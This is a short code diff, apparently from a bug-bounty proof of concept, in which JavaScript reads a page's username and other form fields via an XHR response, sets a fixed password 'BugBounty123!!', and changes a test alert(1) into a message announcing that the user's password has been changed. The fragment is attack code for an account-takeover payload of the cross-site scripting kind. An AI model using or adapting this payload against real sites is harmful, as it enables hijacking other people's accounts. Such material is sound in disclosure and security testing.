@@ -24,8 +24,8 @@ xhr.onreadystatechange = function () {
             const o_last_name =  doc.querySelector('input[name="o_last_name"]')?.value || null;  
             const username =  doc.querySelector('input[id="username"]')?.value || null;
             const password= "BugBounty123!!";
-            //alert("New password has changed for username:"username" to password:"password);
-            alert(1);
+            alert("New password has changed for username:"+username+" to password:"+password);
+            
 
             //window.emailContactPointId = emailContactPointId;
             //window.emailAddress = emailAddress;
